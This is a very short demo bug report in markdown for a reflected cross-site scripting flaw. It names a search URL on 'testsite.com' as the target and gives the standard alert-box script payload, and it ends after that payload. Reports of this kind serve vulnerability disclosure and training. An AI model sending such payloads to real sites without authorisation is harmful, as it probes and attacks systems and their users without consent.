# 🐞 Reflected XSS Report (Demo)

## 🖥️ Target

`https://testsite.com/search?q=`

## 💥 Payload

```html
<script>alert('XSS')</script>
